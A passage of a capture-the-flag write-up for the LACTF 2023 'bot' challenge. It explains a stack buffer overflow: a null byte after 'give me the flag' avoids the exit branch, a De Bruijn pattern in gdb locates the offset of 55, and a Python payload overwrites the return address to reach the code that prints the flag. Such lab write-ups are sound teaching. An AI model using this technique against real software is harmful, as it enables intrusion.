## Finding the offset of the return address of main()

```

we can copy it and paste it as the input into `./bot` to figure out the offset from the start of the input buffer from which the return address begins. 

Note, however, that the following code exists in `bot.c`

```c
else {
    puts("sorry, i didn't understand your question");
    exit(1);
}
```

We need to enter a different branch to ensure that the function will return properly and use our address. 

That branch is

```c
if (strcmp(input, "give me the flag") == 0) {
    puts("lol no");
}
```

We can thus provide "give me the flag" and then the null byte as  input, before writing the rest of our payload. 

In this case, we have yet to find the offset, so we write in the DeBrujin sequence generated previously. Namely, in gdb, for the input after starting the executable

```bash
gefâž¤  r
Starting program: /mnt/d/CTFs/LACTF 2023/bot/bot_patched
hi, how can i help?
```

We pass in the string

```bash
give me the flag^@aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaactaaaaaacuaaaaaacvaaaaaacwaaaaaacxaaaaaacyaaaaaaczaaaaaadbaaaaaadcaaaaaaddaaaaaadeaaaaaadfaaaaaadgaaaaaadhaaaaaadiaaaaaadjaaaaaadkaaaaaadlaaaaaadmaaaaaadnaaaaaadoaaaaaadpaaaaaadqaaaaaadraaaaaadsaaaaaadtaaaaaaduaaaaaadvaaaaaadwaaaaaadxaaaaaadyaaaaaadzaaaaaaebaaaaaaecaaaaaaedaaaaaaeeaaaaaaefaaaaaaegaaaaaaehaaaaaaeiaaaaaaejaaaaaaekaaaaaaelaaaaaaemaaaaaaenaaaaaaeoaaaaaaepaaaaaaeqaaaaaaeraaaaaaesaaaaaaetaaaaaaeuaaaaaaevaaaaaaewaaaaaaexaaaaaaeyaaaaaaezaaaaaafbaaaaaafcaaaaaaf
```

Note that there is no newline character between "the" and "flag" - the non-spaced string is simply taking an entire line. Also note that the '^@' string is Ctrl-2 which sends the null byte. 

In the resulting segfault, we use gdb's `pattern search $rsp` function to find the offset of the De Brujin sequence that is present in $rsp at the time of segfault. 

```bash
[+] Searching for '6168616161616161'/'6161616161616861' with period=8
[+] Found at offset 55 (little-endian search) likely
```

## Generating the Payload

In Python, our payload is thus

```Python
b"give me the flag\x00" + b'A'*55 + p64(0x000000000040128e)
```

where 0x000000000040128e is the address of loading the first argument of the first `puts` in this block into `$rdi`. 

```c
if (give_flag) {
    puts("ok here's your flag");
    system("cat flag.txt");
} else {
    puts("no");
}
```
